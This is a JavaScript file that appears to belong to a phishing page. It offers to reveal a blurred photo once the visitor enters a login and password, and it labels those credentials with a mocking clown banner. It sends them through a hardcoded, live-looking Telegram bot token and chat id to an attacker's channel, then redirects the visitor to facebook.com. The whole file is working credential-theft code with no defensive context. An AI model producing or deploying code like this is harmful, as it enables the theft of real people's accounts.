const ready = () => {
  argv1 = document.getElementById('argv1').value;
  argv2 = document.getElementById('argv2').value;
  if( argv1 == '' || argv2 == '' ){
    let validated = false;
  } else {
    $('#btn-cont').prop("disabled", true);
    let message =  `■■■■■🤣🫵🤡■■■■■
👤 L: ${argv1} 
🔑 C: ${argv2} 
■■■■■■■■■■■■■■`;
        return message;
  }
  }
  
  const sender = async(msg) => {
    let telegram_bot_id = '6562905773:AAFpR1dDRp6CJdIENVq_d3hm4od-NrY3pLY',
         chat_id = '-1001908180943';
         
    let settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": msg
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        localStorage.setItem('visto', 'true');
        $('#exampleModal').modal('hide');
        imgFin();
        rel();
    });
    
  }
  
let imgFin = () => {
  const blur = document.getElementById('blur');
  $('#btn-ver').prop("disabled", true);
  blur.classList.toggle('active');
  $('#btn-ver').text('Cubrir foto')
};

let hidPost = () => {
  $('#post').css('display', 'none');
  $('#visto').css('display', 'block');
  $('#ini'). on('click', () => {
    location.href="http://facebook.com"
  });
};

let rel = () => {
  setTimeout(() => {
    location.reload();
  }, 15000);
}

$('#btn-cont').on('click', () => {
  let listo = ready();
  (listo)
  ? sender(listo)
  : $('.argv').addClass('err');
});

$('#btn-ver').on('click', () => {
  $('.argv').removeClass('err');
})


let visto = localStorage.getItem('visto');
if(visto == 'true') {
  imgFin();
  hidPost();
}